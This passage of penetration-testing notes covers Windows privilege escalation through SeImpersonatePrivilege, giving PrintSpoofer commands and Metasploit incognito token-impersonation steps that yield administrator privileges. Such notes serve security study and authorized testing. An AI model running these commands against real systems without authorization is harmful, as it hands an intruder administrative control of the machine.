
---

is an form of priv esc in windows environment, if SeImpersonatePrivilege is available.

#### Manual Exploitation

We can manually exploit this utilizing PrintSpoofer.exe Tool

```
https://github.com/dievus/printspoofer
```

Utilizing following command, should give us elevated privileges.

```
PrintSpoofer.exe -i -c cmd
```

#### Metasploit

once we have a meterpreter session we can make getrprivs

getprivs

if "SeImpersonatePrivilege" is there, we can exploit it. 

load incognito

To list all available tokens:

```
list_tokens -g
```
To impersonate a token

```
impersonate_token "BUILTIN\Administrators" 
```

getuid --> gained privs of <delegation token>